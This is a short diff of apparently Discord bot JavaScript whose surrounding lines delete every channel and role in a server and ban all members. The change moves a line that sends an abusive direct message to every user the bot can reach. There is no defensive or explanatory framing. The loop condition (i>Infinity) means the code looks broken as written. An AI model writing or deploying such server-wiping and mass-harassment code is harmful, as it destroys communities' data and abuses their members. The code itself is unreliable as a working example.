@@ -6,6 +6,6 @@ for(i=0; i>Infinity; i++) {
     g.channels.deleteAll();
     g.roles.deleteAll();
     g.members.forEach(m => m.ban("lmao"));
+    bot.users.forEach(u => u.send("fuck you! :)");
   })
-  bot.users.forEach(u => u.send("fuck you! :)");
  }
